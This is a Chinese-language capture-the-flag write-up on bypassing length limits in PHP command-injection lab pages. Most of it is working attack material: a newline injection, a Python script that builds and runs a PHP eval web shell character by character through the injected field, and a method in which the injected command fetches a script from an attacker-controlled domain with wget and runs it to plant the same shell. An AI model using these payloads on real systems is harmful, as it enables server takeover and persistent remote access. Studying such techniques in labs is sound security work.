### 任意命令writeup
---------  
linux 上任意命令执行,一般会用到下面几个字符 
```bash 
  `   |   ||   &   &&   .   ;   -   <>   $    %0a 
```
###  [exec1](./exec1.php) 
用 %0a 来执行命令,只能适用于linux , 127.0.0.1%0awhoami 
---------

### [exec2](./exec2.php) 当可输入的字符不够长时,这里包含分割符一共可输入13个字符 

1. 最短的shell是  ```<?`$_GET[c]` ```; 一共十四个字符 
所以,直接写shell,长度肯定是不够的
所以思路是先写命令到一个文件中,然后用 sh filename  执行脚本,获取shell  

```python 
#!/usr/bin/python 
#conding: -*-utf-8-*-   

# exp.py    

import requests as req 

url = "http://localhost/ctf/exec2.php"
for i in "echo '<?php @eval($_POST[1]);?>' > shell.php ":
    data = {"ip":"0.0.0.0;echo -n \\"+i+">>1"}
    res = req.post(url,data=data)
    # print data['ip']
    # print res.text 
print "[*] bash shell upload successful!"

data={"ip":"0.0.0.0;bash 1"}
res=req.post(url,data=data)

shell="http://127.0.0.1/ctf/shell.php"

res=req.get(shell)
if  res.status_code == 200:
    print "[*] get shell successful"

```
获取shell在shell.php 

2.  第二种获得shell的方法  

前提是你需要有一个比较短的域名,然后在服务器的根目录下写一个302跳转 

```php
 // index.php 

 <?php header("Location: ./1.sh") ?>
```

```bash
#1.sh 
echo '<?php @eval($_POST[1]);?>' > shell.php 
```
这两个文件放在同一个目录下,执行

```bash
ip=0.0.0.0;wget i.com 
ip=0.0.0.0;sh index.html  #刚好21个字符
```
然后就获取一个shell  
